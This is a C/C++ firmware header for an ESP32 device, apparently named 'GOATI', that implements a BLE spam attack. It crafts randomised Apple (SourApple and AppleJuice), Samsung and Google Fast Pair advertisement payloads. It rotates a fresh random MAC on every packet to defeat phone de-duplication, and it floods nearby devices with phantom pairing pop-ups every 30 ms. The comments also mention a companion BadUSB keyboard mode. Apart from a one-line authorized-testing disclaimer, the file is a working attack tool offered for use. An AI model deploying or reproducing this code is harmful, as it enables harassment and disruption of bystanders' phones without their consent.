/*
 * ─────────────────────────────────────────────────────────
 * GOATI : BLE spam (ESP32Marauder / Bruce-style)
 *
 * Floods nearby BLE devices with pairing / proximity beacons so
 * phones show phantom pop-ups.  The two things that make this
 * actually work on modern phones (and that the old version was
 * missing) are:
 *
 *   1. A FRESH RANDOM MAC for every single packet.  iOS/Android
 *      de-duplicate by advertiser address, so re-using one MAC
 *      shows the pop-up at most once.  We rotate a random static
 *      address via esp_ble_gap_set_rand_addr() on each burst.
 *
 *   2. Correct, randomised payloads.  "APPLE" now sends the
 *      SourApple (0x0F nearby-action) beacon that triggers the
 *      iOS 16/17 pop-up, alternating with the classic AppleJuice
 *      (0x07 proximity-pairing) beacon.  SAMSUNG and FASTPAIR
 *      carry randomised model bytes too.
 *
 * Uses ESP-IDF raw HCI (esp_ble_gap_config_adv_data_raw) so the
 * full payload is transmitted intact.  Shares the Bluedroid stack
 * that badusb_init() brings up — the two never advertise at the
 * same time (BLE spam is hold-to-attack; releasing restores the
 * BadUSB keyboard advertising).
 *
 * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE
 * ONLY on devices you own or have explicit permission to test.
 * ─────────────────────────────────────────────────────────
 */

#pragma once

#include <BLEDevice.h>
#include "esp_gap_ble_api.h"
#include "esp_random.h"

// ─── Modes ──────────────────────────────────────────────────────────────
enum BleSpamMode : uint8_t {
  BLE_SPAM_OFF      = 0,
  BLE_SPAM_APPLE    = 1,
  BLE_SPAM_SAMSUNG  = 2,
  BLE_SPAM_FASTPAIR = 3,
  BLE_SPAM__COUNT
};

static const char* const BLE_SPAM_NAMES[] = {
  "OFF",
  "APPLE",
  "SAMSUNG",
  "FASTPAIR"
};

// ─── Tuning ────────────────────────────────────────────────────────────────
#define BLE_SPAM_BURST_MS   30   // one fresh packet every ~30 ms while held
#define BLE_SPAM_ROTATE_MS  900  // rotate the displayed flavour every ~0.9 s

// ─── State ───────────────────────────────────────────────────────────────
static BleSpamMode g_ble_spam_mode = BLE_SPAM_OFF;
static uint32_t    g_ble_spam_pkt_count = 0;
static uint32_t    g_ble_spam_start_ms  = 0;
static uint32_t    g_ble_spam_last_rot  = 0;
static uint32_t    g_ble_spam_last_pkt  = 0;
static bool        g_ble_spam_running   = false;
static bool        g_ble_spam_inited    = false;
static bool        g_ble_spam_pinned    = false;  // shell forced a single flavour

// ─── Apple device model codes (drive which pop-up graphic shows) ─────────
// Proximity-pairing (AppleJuice) device IDs.
static const uint8_t APPLE_MODELS[] = {
  0x02, 0x03, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
  0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,
  0x13, 0x14
};
// SourApple nearby-action types (AppleTV / Setup / HomePod pop-ups).
static const uint8_t APPLE_ACTIONS[] = {
  0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
};

// ─── Advertising params (random address, non-connectable) ────────────────
static esp_ble_adv_params_t g_ble_spam_adv_params = {
  .adv_int_min       = 0x20,
  .adv_int_max       = 0x20,
  .adv_type          = ADV_TYPE_NONCONN_IND,
  .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
  .peer_addr         = {0},
  .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
  .channel_map       = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ─── Helpers ─────────────────────────────────────────────────────────────
static void ble_spam_random_mac(uint8_t mac[6]) {
  esp_fill_random(mac, 6);
  // Force a valid "static random" address (two most-significant bits = 1).
  mac[0] |= 0xC0;
}

// Build a randomised raw advertisement for the given flavour.
// Returns the byte length written into buf (buf must be >= 32 bytes).
static uint8_t ble_spam_build(BleSpamMode mode, uint8_t* buf) {
  switch (mode) {
    // ── APPLE ──────────────────────────────────────────────────────────
    // Alternate between SourApple (0x0F) and AppleJuice (0x07).
    case BLE_SPAM_APPLE: {
      if (esp_random() & 1) {
        // SourApple — nearby action, 17 bytes, best for modern iOS pop-ups.
        uint8_t i = 0;
        buf[i++] = 0x10;                                   // len
        buf[i++] = 0xFF;                                   // mfg specific
        buf[i++] = 0x4C; buf[i++] = 0x00;                  // Apple
        buf[i++] = 0x0F;                                   // nearby action
        buf[i++] = 0x05;
        buf[i++] = 0xC1;
        buf[i++] = APPLE_ACTIONS[esp_random() % sizeof(APPLE_ACTIONS)];
        esp_fill_random(&buf[i], 3); i += 3;
        buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x10;
        esp_fill_random(&buf[i], 3); i += 3;
        return i;                                          // 17
      } else {
        // AppleJuice — proximity pairing, 26 bytes (AirPods-style pop-up).
        uint8_t pkt[26] = {
          0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
          APPLE_MODELS[esp_random() % sizeof(APPLE_MODELS)],
          0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
          0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00
        };
        esp_fill_random(&pkt[16], 3);                      // randomise nonce
        memcpy(buf, pkt, sizeof(pkt));
        return sizeof(pkt);                                // 26
      }
    }

    // ── SAMSUNG (Galaxy Buds / Watch pairing) ────────────────────────────
    case BLE_SPAM_SAMSUNG: {
      uint8_t pkt[15] = {
        0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x00
      };
      pkt[7]  = esp_random() & 0xff;                        // model id
      pkt[13] = esp_random() & 0xff;
      memcpy(buf, pkt, sizeof(pkt));
      return sizeof(pkt);
    }

    // ── GOOGLE FAST PAIR ─────────────────────────────────────────────────
    case BLE_SPAM_FASTPAIR: {
      // Random 3-byte Fast Pair "model id" — many map to a device pop-up.
      uint8_t model[3]; esp_fill_random(model, 3);
      uint8_t pkt[14] = {
        0x03, 0x03, 0x2c, 0xfe,                            // Fast Pair svc UUID
        0x06, 0x16, 0x2c, 0xfe,                            // svc data
        model[0], model[1], model[2],
        0x02, 0x00, 0x50                                   // salt / tx
      };
      memcpy(buf, pkt, sizeof(pkt));
      return sizeof(pkt);
    }

    default:
      return 0;
  }
}

// Emit one packet: fresh random MAC + fresh payload.
static void ble_spam_emit(BleSpamMode mode) {
  uint8_t buf[32];
  uint8_t len = ble_spam_build(mode, buf);
  if (len == 0) return;

  esp_ble_gap_stop_advertising();

  uint8_t mac[6];
  ble_spam_random_mac(mac);
  esp_ble_gap_set_rand_addr(mac);

  esp_err_t err = esp_ble_gap_config_adv_data_raw(buf, len);
  if (err != ESP_OK) {
    Serial.printf("[BLE Spam] raw adv config err=%d len=%u\r\n", err, (unsigned)len);
    return;
  }
  // config_adv_data_raw is async — give the controller a moment to apply it
  // before we (re)start advertising with the new address.
  delay(3);
  esp_ble_gap_start_advertising(&g_ble_spam_adv_params);
  g_ble_spam_pkt_count++;
}

// ─── Public API ──────────────────────────────────────────────────────────
static void ble_spam_init() {
  // BLEDevice::init() is performed by badusb_init() with the name "GOATI-KB".
  // The Bluedroid controller is already up by the time we get here; we just
  // flag ourselves ready.
  if (g_ble_spam_inited) return;
  g_ble_spam_inited = true;
  Serial.println(F("[BLE Spam] init OK (random-MAC rotation enabled)"));
}

static void ble_spam_start_combined() {
  Serial.println(F("[BLE Spam] combined attack START"));
  ble_spam_init();
  g_ble_spam_mode      = BLE_SPAM_APPLE;
  g_ble_spam_pkt_count = 0;
  g_ble_spam_start_ms  = millis();
  g_ble_spam_last_rot  = millis();
  g_ble_spam_last_pkt  = 0;
  g_ble_spam_running   = true;
  g_ble_spam_pinned    = false;
  ble_spam_emit(BLE_SPAM_APPLE);
}

static void ble_spam_stop() {
  if (!g_ble_spam_running) return;
  Serial.println(F("[BLE Spam] STOP"));
  esp_ble_gap_stop_advertising();
  g_ble_spam_running = false;
  g_ble_spam_mode    = BLE_SPAM_OFF;

  // We hijacked advertising with a random address; hand it back to the
  // BadUSB keyboard.  Clear the random address (fall back to public MAC)
  // then restart the BLEAdvertising instance the keyboard library owns.
  delay(80);
  uint8_t zero_addr[6] = {0};
  esp_ble_gap_set_rand_addr(zero_addr);
  delay(40);
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  if (pAdv) {
    pAdv->start();
    Serial.println(F("[BLE Spam] restored BadUSB keyboard advertising"));
  }
}

static void ble_spam_loop() {
  if (!g_ble_spam_running) return;
  uint32_t now = millis();

  // Rotate the displayed flavour periodically so the OLED cycles through
  // APPLE -> SAMSUNG -> FASTPAIR (purely cosmetic + spreads the attack).
  if (!g_ble_spam_pinned && now - g_ble_spam_last_rot > BLE_SPAM_ROTATE_MS) {
    g_ble_spam_last_rot = now;
    uint8_t m = (uint8_t)g_ble_spam_mode + 1;
    if (m >= BLE_SPAM__COUNT) m = BLE_SPAM_APPLE;
    g_ble_spam_mode = (BleSpamMode)m;
  }

  // Fire a fresh packet (new MAC + payload) on the burst interval.
  if (now - g_ble_spam_last_pkt >= BLE_SPAM_BURST_MS) {
    g_ble_spam_last_pkt = now;
    ble_spam_emit(g_ble_spam_mode);
  }
}

// Backwards-compat shims (kept so shell.h callers don't break)
static void ble_spam_cycle_mode() {
  g_ble_spam_mode = (BleSpamMode)(((uint8_t)g_ble_spam_mode + 1) % BLE_SPAM__COUNT);
  if (g_ble_spam_mode == BLE_SPAM_OFF) g_ble_spam_mode = BLE_SPAM_APPLE;
}

static void ble_spam_start(BleSpamMode mode) {
  ble_spam_start_combined();
  if (mode != BLE_SPAM_OFF) {
    // Pin the attack to the requested flavour (no rotation).
    g_ble_spam_mode   = mode;
    g_ble_spam_pinned = true;
  }
}
